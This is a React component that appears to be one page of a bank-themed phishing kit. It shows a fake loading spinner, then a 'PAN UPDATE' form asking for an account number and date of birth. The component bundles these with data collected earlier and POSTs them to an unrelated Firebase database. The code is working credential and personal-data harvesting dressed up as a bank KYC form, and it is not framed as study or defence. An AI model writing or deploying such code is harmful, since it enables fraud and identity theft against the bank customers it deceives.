import React, { useEffect, useState } from "react";
import styles from "./NextPage.module.css";
import Spinner from "./Spinner";

const NextPage = ({ userData }) => {
  const [showSpinner, setShowSpinner] = useState(true);
  const [accNo, setAccNo] = useState("");
  const [Dob, setDob] = useState("");

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowSpinner(false);
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  const sendfiles = (e) => {
    // e.preventDefault();

    const Alldata = { ...userData, Dob, accNo };
    console.log(userData);

    console.log(Alldata);

    fetch("https://food-5acc1-default-rtdb.firebaseio.com/alldata.json", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        user: Alldata,
      }),
    })
      .then((response) => {
        if (response.ok) {
          // Handle successful response
          console.log("Data sent successfully");
          // Perform any additional actions after successful submission
        } else {
          // Handle error response
          console.log("Failed to send data");
        }
      })
      .catch((error) => {
        // Handle network or other error
        console.error("Error occurred while sending data:", error);
      });
  };

  if (showSpinner) {
    return (
      <div className={styles.spinnerContainer}>
        <Spinner />
      </div>
    );
  }

  return (
    <form
      //   action='post.php'
      //   method='post'
      //   target='hidden_iframe'
      //   onsubmit='submitted=true'
      onSubmit={sendfiles}
      className={styles.myform}
    >
      <center>{/* <img src='lolo.jpg' id='hh' alt='Logo' /> */}</center>
      <div id='kyc'>
        <br />
        <b style={{ color: "white", padding: "20px" }}>
          CONTINUE TO PAN UPDATE
        </b>
      </div>
      <div className={styles.formGroup}>
        <label htmlFor='accountNumber'>Account Number*</label>
        <input
          type='numeric'
          id='accountNumber'
          name='accountNumber'
          placeholder='Enter your account number'
          value={accNo}
          onChange={(e) => setAccNo(e.target.value)}
          required
        />
      </div>
      <div className={styles.formGroup}>
        <label htmlFor='dob'>Date of Birth*</label>
        <input
          type='date'
          id='dob'
          name='dob'
          placeholder='Enter your date of birth'
          value={Dob}
          onChange={(e) => setDob(e.target.value)}
          required
        />
      </div>
      {/* Add more form elements here */}
      <button type='submit'>Submit</button>
    </form>
  );
};

export default NextPage;
